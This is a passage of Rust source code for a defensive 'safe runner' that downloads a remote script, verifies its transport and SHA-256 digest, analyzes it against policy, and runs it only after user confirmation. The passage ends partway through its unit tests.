/// Safe runner — Unix only.
/// Downloads a script, analyzes it, optionally executes it with user confirmation.
use std::fs;
use std::io::{self, BufRead, Write};
use std::path::Path;
use std::process::Command;

use sha2::{Digest, Sha256};

use crate::receipt::Receipt;
use crate::script_analysis;
use crate::verdict::{Action, Verdict};

pub struct RunResult {
    pub receipt: Receipt,
    /// Redacted policy-complete body verdict. `None` only for a deliberately
    /// non-executing inspection whose bytes/interpreter could not be analyzed
    /// completely. The unredacted/raw rule IDs remain confined to the audit path.
    pub verdict: Option<Verdict>,
    pub analysis_complete: bool,
    /// True when complete analysis refused execution (distinct from `--no-exec`
    /// or a user-cancelled prompt). Carries the blocking verdict to JSON callers.
    pub refused: bool,
    pub executed: bool,
    pub exit_code: Option<i32>,
}

/// A pluggable executor for the final "run the downloaded script" step. The core
/// `runner` owns download / hashing / analysis / the confirmation prompt, but the
/// *execution* can be delegated so the CLI crate (E5) can run the interpreter
/// inside the OS containment capsule without `tirith-core` depending on the
/// capsule launcher (which is async/OS-API-bound and lives in the CLI crate).
///
/// Given the typed invocation, private hash-verified execution file, and bytes
/// read back from that still-open file, run the script and return its exit code.
/// The content-addressed cache is never passed to an executor.
pub type ScriptExecutor =
    Box<dyn Fn(&ScriptInvocation, &std::path::Path, &[u8]) -> Result<i32, String>>;

/// Shell interpreters that a safe-command rewrite may explicitly preserve.
/// These names are closed and path-free so an attacker cannot turn a generated
/// suggestion into an arbitrary program launch.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PipeInterpreter {
    Sh,
    Bash,
    Zsh,
    Dash,
    Ksh,
    Fish,
    Ash,
}

impl PipeInterpreter {
    /// Stable executable name passed directly to the process launcher.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Sh => "sh",
            Self::Bash => "bash",
            Self::Zsh => "zsh",
            Self::Dash => "dash",
            Self::Ksh => "ksh",
            Self::Fish => "fish",
            Self::Ash => "ash",
        }
    }
}

impl std::fmt::Display for PipeInterpreter {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

impl std::str::FromStr for PipeInterpreter {
    type Err = String;

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        match value {
            "sh" => Ok(Self::Sh),
            "bash" => Ok(Self::Bash),
            "zsh" => Ok(Self::Zsh),
            "dash" => Ok(Self::Dash),
            "ksh" => Ok(Self::Ksh),
            "fish" => Ok(Self::Fish),
            "ash" => Ok(Self::Ash),
            _ => Err(format!(
                "unsupported stdin interpreter {value:?}; expected sh, bash, zsh, dash, ksh, fish, or ash"
            )),
        }
    }
}

/// How the reviewed bytes reach the selected interpreter.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ScriptInputMode {
    /// Invoke the interpreter with the private file path (manual `tirith run`).
    File,
    /// Pipe the reviewed bytes to stdin (safe rewrite of `<fetch> | <shell>`).
    Stdin,
}

/// Exact interpreter invocation selected before download. A forced stdin
/// invocation deliberately overrides any shebang in the remote bytes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptInvocation {
    /// Closed interpreter program name (never an arbitrary generated path).
    pub interpreter: String,
    /// Exact argument boundaries passed without a shell.
    pub args: Vec<String>,
    /// Whether bytes arrive by private path or stdin.
    pub input_mode: ScriptInputMode,
}

/// Validate the narrow argv contract safe-command suggestions can preserve.
/// Every supported shell may read stdin with no arguments. POSIX-family shells
/// additionally support the explicit `-s -- <literal operands...>` form. Fish
/// has no equivalent `-s` contract and therefore remains no-args only.
pub fn pipe_interpreter_args_supported(interpreter: PipeInterpreter, args: &[String]) -> bool {
    if args.is_empty() {
        return true;
    }
    if interpreter == PipeInterpreter::Fish
        || args.len() < 2
        || args[0] != "-s"
        || args[1] != "--"
        || args.len() > 34
    {
        return false;
    }
    args[2..]
        .iter()
        .all(|arg| arg.len() <= 4096 && !arg.is_empty() && !arg.chars().any(char::is_control))
}

/// Caller request corresponding to a verified pipe-to-shell suggestion.
#[derive(Debug, Clone)]
pub struct RequestedPipeInvocation {
    /// The selected shell from the original pipeline.
    pub interpreter: PipeInterpreter,
    /// Narrow, prevalidated literal argv from the original sink.
    pub args: Vec<String>,
}

pub struct RunOptions {
    pub url: String,
    pub no_exec: bool,
    pub interactive: bool,
    pub expected_sha256: Option<String>,
    /// A typed stdin invocation emitted by the safe-command rewriter. When set,
    /// the chosen interpreter and argv override the downloaded shebang.
    pub requested_pipe_invocation: Option<RequestedPipeInvocation>,
    /// Optional contained executor for the run step (E5). `None` keeps the
    /// built-in uncontained execution.
    pub exec_fn: Option<ScriptExecutor>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DownloadPurpose {
    Execute,
    SaveOnly,
}

#[derive(Debug)]
struct ValidatedDownloadRequest {
    url: url::Url,
    expected_sha256: Option<String>,
}

struct DownloadedBytes {
    content: Vec<u8>,
    sha256: String,
    final_url: String,
    redirects: Vec<String>,
}

struct ScriptReview {
    interpreter: String,
    legacy: script_analysis::ScriptAnalysis,
    analysis_complete: bool,
    incomplete_reason: Option<&'static str>,
    raw_verdict: Option<Verdict>,
    effective_verdict: Option<Verdict>,
    policy: Option<crate::policy::Policy>,
}

struct ExecutionFile {
    _private_dir: tempfile::TempDir,
    file: tempfile::NamedTempFile,
}

impl ExecutionFile {
    fn path(&self) -> &Path {
        self.file.path()
    }

    fn read_verified(&self, expected_len: usize, expected_sha256: &str) -> Result<Vec<u8>, String> {
        let mut reader = self
            .file
            .as_file()
            .try_clone()
            .map_err(|e| format!("clone execution file handle: {e}"))?;
        use std::io::{Read as _, Seek as _};
        reader
            .seek(std::io::SeekFrom::Start(0))
            .map_err(|e| format!("rewind execution file: {e}"))?;
        let mut bytes = Vec::with_capacity(expected_len);
        reader
            .take(expected_len as u64 + 1)
            .read_to_end(&mut bytes)
            .map_err(|e| format!("read execution file: {e}"))?;
        if bytes.len() != expected_len || sha256_hex(&bytes) != expected_sha256 {
            return Err("execution file digest changed before spawn".to_string());
        }
        Ok(bytes)
    }
}

/// Interpreters matched by exact name only.
const ALLOWED_EXACT: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "ash", "deno", "bun", "nodejs",
];

/// Interpreter families allowed with an optional `digits[.digits]*` version
/// suffix (python3, python3.11, ruby3.2, node18, perl5.38).
const ALLOWED_FAMILIES: &[&str] = &["python", "ruby", "perl", "node"];

fn is_allowed_interpreter(interpreter: &str) -> bool {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);

    if ALLOWED_EXACT.contains(&base) {
        return true;
    }

    for &family in ALLOWED_FAMILIES {
        if base == family {
            return true;
        }
        if let Some(suffix) = base.strip_prefix(family) {
            if is_valid_version_suffix(suffix) {
                return true;
            }
        }
    }

    false
}

/// A valid version suffix is `digits (.digits)*` ("3", "3.11"); rejects "", ".3", "3.", "evil".
fn is_valid_version_suffix(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    s.split('.')
        .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
}

fn normalize_sha256_pin(expected: Option<&str>) -> Result<Option<String>, String> {
    let Some(expected) = expected else {
        return Ok(None);
    };
    if expected.len() != 64 || !expected.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(format!(
            "invalid SHA-256 pin: expected exactly 64 hexadecimal characters, got '{}'",
            crate::util::truncate_bytes(expected, 16)
        ));
    }
    Ok(Some(expected.to_ascii_lowercase()))
}

/// Validate all caller-controlled request inputs before constructing a client or
/// resolving a hostname. Execution requires authenticated transport: HTTPS, or
/// the narrow compatibility case of a directly requested HTTP URL with a valid
/// digest pin. Save-only downloads retain their historical HTTP support.
fn validate_download_request(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<ValidatedDownloadRequest, String> {
    // The pin is intentionally first: malformed integrity metadata must fail
    // before DNS, socket, proxy, or other network-visible work.
    let expected_sha256 = normalize_sha256_pin(expected_sha256)?;
    let parsed = url::Url::parse(url).map_err(|e| format!("invalid URL: {e}"))?;
    validate_initial_transport(&parsed, expected_sha256.is_some(), purpose)?;
    crate::url_validate::validate_fetch_url(parsed.as_str())?;
    Ok(ValidatedDownloadRequest {
        url: parsed,
        expected_sha256,
    })
}

fn validate_initial_transport(
    parsed: &url::Url,
    has_sha256_pin: bool,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    if purpose == DownloadPurpose::Execute && parsed.scheme() == "http" && !has_sha256_pin {
        return Err(
            "executable downloads require HTTPS; direct HTTP is allowed only with an explicit SHA-256 pin"
                .to_string(),
        );
    }
    Ok(())
}

fn validate_redirect_target(
    previous: &url::Url,
    target: &url::Url,
    purpose: DownloadPurpose,
) -> Result<(), String> {
    // No redirect hop in an executable transaction may use cleartext. This is
    // stricter than the direct-HTTP compatibility exception because a pin does
    // not justify silently changing the requested transport path.
    if purpose == DownloadPurpose::Execute && target.scheme() != "https" {
        return Err(format!(
            "executable redirect must use HTTPS ({} -> {})",
            previous.scheme(),
            target.scheme()
        ));
    }
    crate::url_validate::validate_fetch_url(target.as_str()).map(|_| ())
}

fn require_success_status(status: reqwest::StatusCode) -> Result<(), String> {
    if status.is_success() {
        Ok(())
    } else {
        Err(format!("download failed with HTTP status {status}"))
    }
}

fn sha256_hex(content: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content);
    format!("{:x}", hasher.finalize())
}

fn download_bounded(
    url: &str,
    expected_sha256: Option<&str>,
    purpose: DownloadPurpose,
) -> Result<DownloadedBytes, String> {
    let request = validate_download_request(url, expected_sha256, purpose)?;
    let redirect_list = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let redirect_list_clone = redirect_list.clone();

    let client = reqwest::blocking::Client::builder()
        .no_proxy()
        .dns_resolver(crate::ssrf_guard::fetch_resolver())
        .redirect(reqwest::redirect::Policy::custom(move |attempt| {
            if let Ok(mut list) = redirect_list_clone.lock() {
                list.push(attempt.url().to_string());
            }
            if attempt.previous().len() >= 10 {
                return attempt.error("too many redirects");
            }
            let previous = attempt.previous().last().unwrap_or(attempt.url());
            match validate_redirect_target(previous, attempt.url(), purpose) {
                Ok(()) => attempt.follow(),
                Err(reason) => attempt.error(reason),
            }
        }))
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .map_err(|e| format!("http client: {e}"))?;

    let response = client
        .get(request.url)
        .send()
        .map_err(|e| format!("download failed: {e}"))?;
    require_success_status(response.status())?;
    let final_url = response.url().to_string();

    const MAX_BODY: u64 = 10 * 1024 * 1024;
    if let Some(len) = response.content_length() {
        if len > MAX_BODY {
            return Err(format!(
                "response too large: {len} bytes (max {} MiB)",
                MAX_BODY / 1024 / 1024
            ));
        }
    }

    use std::io::Read as _;
    let mut content = Vec::new();
    response
        .take(MAX_BODY + 1)
        .read_to_end(&mut content)
        .map_err(|e| format!("read body: {e}"))?;
    if content.len() as u64 > MAX_BODY {
        return Err(format!(
            "response body exceeds {} MiB limit",
            MAX_BODY / 1024 / 1024
        ));
    }

    let sha256 = sha256_hex(&content);
    if let Some(expected) = request.expected_sha256 {
        if sha256 != expected {
            return Err(format!(
                "SHA-256 mismatch: expected {expected}, got {sha256}"
            ));
        }
    }
    let redirects = redirect_list
        .lock()
        .map(|list| list.clone())
        .unwrap_or_default();
    Ok(DownloadedBytes {
        content,
        sha256,
        final_url,
        redirects,
    })
}

fn interpreter_analysis(
    interpreter: &str,
) -> Option<(crate::tokenize::ShellType, bool, &'static str)> {
    let base = interpreter.rsplit('/').next().unwrap_or(interpreter);
    if matches!(base, "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash") {
        return Some((crate::tokenize::ShellType::Posix, true, "sh"));
    }
    if base == "fish" {
        return Some((crate::tokenize::ShellType::Fish, true, "fish"));
    }
    for (family, extension) in [
        ("python", "py"),
        ("ruby", "rb"),
        ("perl", "pl"),
        ("node", "js"),
    ] {
        if base == family
            || base
                .strip_prefix(family)
                .is_some_and(is_valid_version_suffix)
        {
            return Some((crate::tokenize::ShellType::Posix, false, extension));
        }
    }
    if matches!(base, "nodejs" | "deno" | "bun") {
        return Some((crate::tokenize::ShellType::Posix, false, "js"));
    }
    None
}

fn review_script_bytes(
    content: &[u8],
    will_execute: bool,
    interactive: bool,
    cwd: Option<&Path>,
    forced_interpreter: Option<&str>,
) -> Result<ScriptReview, String> {
    let content_str = match std::str::from_utf8(content) {
        Ok(text) => text.to_string(),
        Err(_) if will_execute => {
            return Err("refusing execution: downloaded script is not valid UTF-8".to_string())
        }
        Err(_) => {
            let lossy = String::from_utf8_lossy(content).into_owned();
            let interpreter = forced_interpreter
                .map(str::to_string)
                .unwrap_or_else(|| script_analysis::detect_interpreter(&lossy).to_string());
            return Ok(ScriptReview {
                legacy: script_analysis::analyze(&lossy, &interpreter),
                interpreter,
                analysis_complete: false,
                incomplete_reason: Some("invalid-utf8"),
                raw_verdict: None,
                effective_verdict: None,
                policy: None,
            });
        }
    };
    // A safe rewrite of `<fetch> | <shell>` must preserve the selected shell,
    // not trust a remote shebang to replace it with Python, Node, or anything
    // else. Manual `tirith run` retains shebang detection.
    let interpreter = forced_interpreter
        .map(str::to_string)
        .unwrap_or_else(|| script_analysis::detect_interpreter(&content_str).to_string());
    let Some((shell, command_semantics, extension)) = interpreter_analysis(&interpreter) else {
        if will_execute {
            return Err(format!(
                "refusing execution: interpreter '{interpreter}' has no complete analyzer"
            ));
        }
        return Ok(ScriptReview {
            legacy: script_analysis::analyze(&content_str, &interpreter),
            interpreter,
            analysis_complete: false,
            incomplete_reason: Some("unsupported-interpreter"),
            raw_verdict: None,
            effective_verdict: None,
            policy: None,
        });
    };

    let cwd_string = cwd.map(|path| path.display().to_string());
    let logical_path = cwd
        .unwrap_or_else(|| Path::new("."))
        .join(format!("downloaded-script.{extension}"));
    let ctx = crate::engine::AnalysisContext {
        input: content_str.clone(),
        shell,
        scan_context: if command_semantics {
            crate::extract::ScanContext::Exec
        } else {
            crate::extract::ScanContext::FileScan
        },
        raw_bytes: Some(content.to_vec()),
        interactive,
        cwd: cwd_string,
        file_path: (!command_semantics).then_some(logical_path.clone()),
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
    };
    let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        crate::engine::analyze_without_bypass_returning_policy(&ctx)
    }))
    .map_err(|_| "refusing execution: policy analysis did not complete".to_string())?;
    let (mut raw_verdict, policy) = analyzed;

    // Shell source is both an executable command stream and a code file. The
    // Exec pipeline supplies command/policy rules; add the repository's code-file
    // rules over the same UTF-8 bytes without reopening any path.
    if command_semantics {
        raw_verdict.findings.extend(crate::rules::codefile::check(
            &content_str,
            logical_path.to_str(),
        ));
        raw_verdict.action = crate::verdict::upgraded_action_from_findings(
            &raw_verdict.findings,
            raw_verdict.action,
        );
    }
    raw_verdict.agent_origin = Some(crate::agent_origin::resolve_cli_origin(interactive));
    let session_id = crate::session::resolve_session_id();
    let effective_verdict = crate::escalation::post_process_verdict(
        &raw_verdict,
        &policy,
        &content_str,
        &session_id,
        crate::escalation::CallerContext::Cli,
    );
    Ok(ScriptReview {
        legacy: script_analysis::analyze(&content_str, &interpreter),
        interpreter,
        analysis_complete: true,
        incomplete_reason: None,
        raw_verdict: Some(raw_verdict),
        effective_verdict: Some(effective_verdict),
        policy: Some(policy),
    })
}

fn apply_explicit_bypass(
    review: &mut ScriptReview,
    policy: &crate::policy::Policy,
    requested: bool,
    interactive: bool,
) -> bool {
    let allowed = requested
        && if interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };
    for verdict in [
        review.raw_verdict.as_mut(),
        review.effective_verdict.as_mut(),
    ]
    .into_iter()
    .flatten()
    {
        verdict.bypass_requested = requested;
        verdict.bypass_available = if interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };
        verdict.bypass_honored = allowed;
    }
    allowed
}

fn raw_audit_fields(review: &ScriptReview) -> Option<(String, Vec<String>)> {
    review.raw_verdict.as_ref().map(|raw| {
        (
            format!("{:?}", raw.action),
            raw.findings
                .iter()
                .map(|finding| finding.rule_id.to_string())
                .collect(),
        )
    })
}

fn redacted_result_verdict(review: &ScriptReview) -> Option<Verdict> {
    review.effective_verdict.as_ref().map(|effective| {
        let mut display = effective.clone();
        let custom_patterns = review
            .policy
            .as_ref()
            .map(|policy| policy.dlp_custom_patterns.as_slice())
            .unwrap_or(&[]);
        display.findings = crate::redact::redacted_findings(&display.findings, custom_patterns);
        display
    })
}

fn materialize_execution_file(
    parent: &Path,
    content: &[u8],
    expected_sha256: &str,
) -> Result<ExecutionFile, String> {
    let private_dir = tempfile::Builder::new()
        .prefix(".tirith-run-")
        .tempdir_in(parent)
        .map_err(|e| format!("create private execution directory: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        fs::set_permissions(private_dir.path(), fs::Permissions::from_mode(0o700))
            .map_err(|e| format!("secure execution directory: {e}"))?;
    }
    let mut file = tempfile::NamedTempFile::new_in(private_dir.path())
        .map_err(|e| format!("create private execution file: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        file.as_file()
            .set_permissions(fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("secure execution file: {e}"))?;
    }
    file.write_all(content)
        .map_err(|e| format!("write execution file: {e}"))?;
    file.as_file()
        .sync_all()
        .map_err(|e| format!("sync execution file: {e}"))?;
    // Verify through the still-open file description, never by reopening the
    // pathname. A directory-entry replacement cannot influence this digest.
    let mut verifier = file
        .as_file()
        .try_clone()
        .map_err(|e| format!("clone execution file handle: {e}"))?;
    {
        use std::io::{Read as _, Seek as _};
        verifier
            .seek(std::io::SeekFrom::Start(0))
            .map_err(|e| format!("rewind execution file: {e}"))?;
        let mut written = Vec::with_capacity(content.len());
        verifier
            .take(content.len() as u64 + 1)
            .read_to_end(&mut written)
            .map_err(|e| format!("verify execution file: {e}"))?;
        if written.len() != content.len() || sha256_hex(&written) != expected_sha256 {
            return Err("execution file digest changed before spawn".to_string());
        }
    }
    Ok(ExecutionFile {
        _private_dir: private_dir,
        file,
    })
}

/// Atomically publish downloaded bytes at their content-addressed cache path.
///
/// Bytes are written through a random sibling file and `persist` performs the
/// final rename. The destination is never opened for writing, so a precreated
/// symlink at the predictable digest name cannot redirect writes to its target.
fn persist_cache_entry(cache_dir: &Path, cached_path: &Path, content: &[u8]) -> Result<(), String> {
    let mut tmp =
        tempfile::NamedTempFile::new_in(cache_dir).map_err(|e| format!("tempfile: {e}"))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        tmp.as_file()
            .set_permissions(fs::Permissions::from_mode(0o600))
            .map_err(|e| format!("permissions: {e}"))?;
    }
    tmp.write_all(content)
        .map_err(|e| format!("write cache: {e}"))?;
    // fsync bytes before rename so a crash cannot leave a partial cache entry.
    tmp.as_file()
        .sync_all()
        .map_err(|e| format!("sync cache: {e}"))?;
    tmp.persist(cached_path)
        .map_err(|e| format!("persist cache: {e}"))?;
    // Also fsync the parent directory so the rename itself is crash-durable.
    // Best-effort: persist already succeeded, so a dir-fsync failure is logged.
    crate::util::fsync_parent_dir_logged(cached_path, "run cache");
    Ok(())
}

pub fn run(opts: RunOptions) -> Result<RunResult, String> {
    if !opts.no_exec && !opts.interactive {
        return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
    }
    if let Some(requested) = opts.requested_pipe_invocation.as_ref() {
        if opts.exec_fn.is_none() {
            return Err(
                "a forced stdin interpreter is accepted only with fail-closed capsule execution"
                    .to_string(),
            );
        }
        if !pipe_interpreter_args_supported(requested.interpreter, &requested.args) {
            return Err(format!(
                "unsupported argv for forced stdin interpreter '{}'",
                requested.interpreter
            ));
        }
    }
    let purpose = if opts.no_exec {
        DownloadPurpose::SaveOnly
    } else {
        DownloadPurpose::Execute
    };
    let downloaded = download_bounded(&opts.url, opts.expected_sha256.as_deref(), purpose)?;
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    let cache_dir = crate::policy::data_dir()
        .ok_or("cannot determine data directory")?
        .join("cache");
    fs::create_dir_all(&cache_dir).map_err(|e| format!("create cache: {e}"))?;
    let cached_path = cache_dir.join(&sha256);
    persist_cache_entry(&cache_dir, &cached_path, &content)?;

    let cwd = std::env::current_dir().ok();
    let forced_interpreter = opts
        .requested_pipe_invocation
        .as_ref()
        .map(|requested| requested.interpreter.as_str());
    let mut review = review_script_bytes(
        &content,
        !opts.no_exec,
        opts.interactive,
        cwd.as_deref(),
        forced_interpreter,
    )?;
    let invocation = if let Some(requested) = opts.requested_pipe_invocation.as_ref() {
        ScriptInvocation {
            interpreter: requested.interpreter.as_str().to_string(),
            args: requested.args.clone(),
            input_mode: ScriptInputMode::Stdin,
        }
    } else {
        ScriptInvocation {
            interpreter: review.interpreter.clone(),
            args: Vec::new(),
            input_mode: ScriptInputMode::File,
        }
    };
    // Keep the legacy allowlist as a second, explicit execution gate. The
    // analyzer table is intentionally no broader than this list, but both must
    // agree before an interpreter is invoked.
    if !opts.no_exec && !is_allowed_interpreter(&invocation.interpreter) {
        return Err(format!(
            "interpreter '{}' is not in the allowed list",
            invocation.interpreter
        ));
    }

    let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let bypass_honored = if let Some(policy) = review.policy.clone() {
        apply_explicit_bypass(&mut review, &policy, bypass_requested, opts.interactive)
    } else {
        false
    };

    let (git_repo, git_branch) = detect_git_info();

    let receipt = Receipt {
        url: opts.url.clone(),
        final_url: Some(downloaded.final_url),
        redirects: downloaded.redirects,
        sha256: sha256.clone(),
        size: content.len() as u64,
        domains_referenced: review.legacy.domains_referenced.clone(),
        paths_referenced: review.legacy.paths_referenced.clone(),
        analysis_method: if review.analysis_complete {
            format!("policy-complete:{}", review.interpreter)
        } else {
            format!(
                "static-incomplete:{}",
                review.incomplete_reason.unwrap_or("unknown")
            )
        },
        privilege: if review.legacy.has_sudo {
            "elevated".to_string()
        } else {
            "normal".to_string()
        },
        timestamp: chrono::Utc::now().to_rfc3339(),
        cwd: cwd.as_ref().map(|p| p.display().to_string()),
        git_repo,
        git_branch,
    };

    if let (Some(_), Some(effective), Some(policy)) = (
        review.raw_verdict.as_ref(),
        review.effective_verdict.as_ref(),
        review.policy.as_ref(),
    ) {
        let (raw_action, raw_rule_ids) = raw_audit_fields(&review)
            .expect("raw verdict is present when the complete effective verdict is present");
        let audit_subject = format!("downloaded-script sha256:{sha256}");
        let _ = crate::audit::log_verdict_with_raw(
            effective,
            &audit_subject,
            None,
            Some(uuid::Uuid::new_v4().to_string()),
            &policy.dlp_custom_patterns,
            Some(raw_action),
            Some(raw_rule_ids),
        );
    }
    let result_verdict = redacted_result_verdict(&review);
    if let Some(display) = result_verdict.as_ref() {
        let _ = crate::output::write_human(display, false, std::io::stderr().lock());
    }

    if opts.no_exec {
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    let blocked = review
        .effective_verdict
        .as_ref()
        .is_some_and(|verdict| verdict.action == Action::Block);
    if blocked && !bypass_honored {
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: true,
            executed: false,
            exit_code: Some(Action::Block.exit_code()),
        });
    }

    eprintln!(
        "tirith: downloaded {} bytes (SHA256: {})",
        content.len(),
        crate::receipt::short_hash(&sha256)
    );
    eprintln!("tirith: interpreter: {}", invocation.interpreter);
    if invocation.input_mode == ScriptInputMode::Stdin {
        eprintln!("tirith: script input: stdin");
    }
    if !invocation.args.is_empty() {
        eprintln!("tirith: interpreter argv: {:?}", invocation.args);
    }
    if bypass_honored {
        eprintln!(
            "tirith: blocking body verdict explicitly bypassed via TIRITH=0 (audited with raw findings)"
        );
    }

    let tty = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/tty")
        .map_err(|_| "cannot open /dev/tty for confirmation")?;

    let mut tty_writer = io::BufWriter::new(&tty);
    write!(tty_writer, "Execute this script? [y/N] ").map_err(|e| format!("tty write: {e}"))?;
    tty_writer.flush().map_err(|e| format!("tty flush: {e}"))?;

    let mut reader = io::BufReader::new(&tty);
    let mut response_line = String::new();
    reader
        .read_line(&mut response_line)
        .map_err(|e| format!("tty read: {e}"))?;

    if !response_line.trim().eq_ignore_ascii_case("y") {
        eprintln!("tirith: execution cancelled");
        receipt.save().map_err(|e| format!("save receipt: {e}"))?;
        return Ok(RunResult {
            receipt,
            verdict: result_verdict,
            analysis_complete: review.analysis_complete,
            refused: false,
            executed: false,
            exit_code: None,
        });
    }

    receipt.save().map_err(|e| format!("save receipt: {e}"))?;

    // Never execute the stable content-addressed cache path. Materialize the
    // reviewed in-memory bytes into a fresh 0700 directory / 0600 file, keep its
    // handle alive across execution, and verify its digest before the executor
    // sees the path. A cache replacement therefore cannot change executed bytes.
    let execution = materialize_execution_file(&cache_dir, &content, &sha256)?;
    let execution_bytes = execution.read_verified(content.len(), &sha256)?;
    let exit_code = if let Some(exec) = opts.exec_fn.as_ref() {
        Some(exec(&invocation, execution.path(), &execution_bytes)?)
    } else {
        let mut command = Command::new(&invocation.interpreter);
        match invocation.input_mode {
            ScriptInputMode::File => {
                command.args(&invocation.args).arg(execution.path());
            }
            ScriptInputMode::Stdin => {
                // This branch is unreachable for caller-supplied forced stdin
                // invocations (they require `exec_fn` above), but keeping the
                // primitive correct makes the type's contract explicit.
                command
                    .args(&invocation.args)
                    .stdin(std::process::Stdio::piped());
            }
        }
        let mut child = command.spawn().map_err(|e| format!("execute: {e}"))?;
        let write_result = if invocation.input_mode == ScriptInputMode::Stdin {
            let mut stdin = child
                .stdin
                .take()
                .ok_or_else(|| "execute: interpreter stdin was not piped".to_string())?;
            stdin.write_all(&execution_bytes)
        } else {
            Ok(())
        };
        let status = child.wait().map_err(|e| format!("execute wait: {e}"))?;
        if let Err(error) = write_result {
            if error.kind() != std::io::ErrorKind::BrokenPipe {
                return Err(format!("execute stdin: {error}"));
            }
        }
        status.code()
    };

    Ok(RunResult {
        receipt,
        verdict: result_verdict,
        analysis_complete: review.analysis_complete,
        refused: false,
        executed: true,
        exit_code,
    })
}

/// Outcome of [`download_to_path`].
pub struct DownloadResult {
    /// The path the content was written to (the caller-supplied destination).
    pub path: std::path::PathBuf,
    /// SHA-256 of the downloaded content.
    pub sha256: String,
    /// Final URL after redirects.
    pub final_url: String,
    /// Number of bytes written.
    pub size: u64,
    /// Detected interpreter from the shebang (best-effort, for display).
    pub interpreter: String,
}

/// Download `url` to `dest` WITHOUT executing it (the primitive behind
/// `tirith fetch --save`). Shares [`run`]'s redirect / 30s-timeout / 10 MiB-cap
/// policy, verifies `expected_sha256`, and writes atomically (sibling temp +
/// rename, `0600`). Caller marks `dest` tainted (see `crate::taint`).
pub fn download_to_path(
    url: &str,
    dest: &std::path::Path,
    expected_sha256: Option<&str>,
) -> Result<DownloadResult, String> {
    let downloaded = download_bounded(url, expected_sha256, DownloadPurpose::SaveOnly)?;
    let content = downloaded.content;
    let sha256 = downloaded.sha256;

    // Atomic write: sibling temp + rename, 0600.
    let dir = dest.parent().filter(|p| !p.as_os_str().is_empty());
    if let Some(parent) = dir {
        fs::create_dir_all(parent).map_err(|e| format!("create dest dir: {e}"))?;
    }
    let tmp_dir = dir.unwrap_or_else(|| std::path::Path::new("."));
    {
        use tempfile::NamedTempFile;
        let mut tmp = NamedTempFile::new_in(tmp_dir).map_err(|e| format!("tempfile: {e}"))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .map_err(|e| format!("permissions: {e}"))?;
        }
        tmp.write_all(&content)
            .map_err(|e| format!("write download: {e}"))?;
        // fsync bytes before rename so a crash can't leave a partial file at dest.
        tmp.as_file()
            .sync_all()
            .map_err(|e| format!("sync download: {e}"))?;
        tmp.persist(dest)
            .map_err(|e| format!("persist download: {e}"))?;
        // Also fsync the parent dir so the rename survives a crash (CodeRabbit
        // R9 #B). Best-effort: a dir-fsync failure is logged not propagated (R13 #5).
        crate::util::fsync_parent_dir_logged(dest, "downloaded script");
    }

    let content_str = String::from_utf8_lossy(&content);
    let interpreter = script_analysis::detect_interpreter(&content_str).to_string();

    Ok(DownloadResult {
        path: dest.to_path_buf(),
        sha256,
        final_url: downloaded.final_url,
        size: content.len() as u64,
        interpreter,
    })
}

/// Detect git repo remote URL and current branch.
fn detect_git_info() -> (Option<String>, Option<String>) {
    let repo = Command::new("git")
        .args(["remote", "get-url", "origin"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string());

    let branch = Command::new("git")
        .args(["rev-parse", "--abbrev-ref", "HEAD"])
        .output()
        .ok()
        .filter(|o| o.status.success())
        .and_then(|o| String::from_utf8(o.stdout).ok())
        .map(|s| s.trim().to_string());

    (repo, branch)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn execution_transport_rejects_http_without_pin() {
        let err = validate_download_request(
            "http://downloads.example/install.sh",
            None,
            DownloadPurpose::Execute,
        )
        .expect_err("unpinned HTTP executable download must fail");
        assert!(err.contains("HTTPS"));
    }

    #[test]
    fn execution_transport_allows_direct_http_with_valid_compatibility_pin() {
        let parsed = url::Url::parse("http://downloads.example/install.sh").unwrap();
        validate_initial_transport(&parsed, true, DownloadPurpose::Execute)
            .expect("a valid digest pin authenticates a direct HTTP compatibility download");
    }

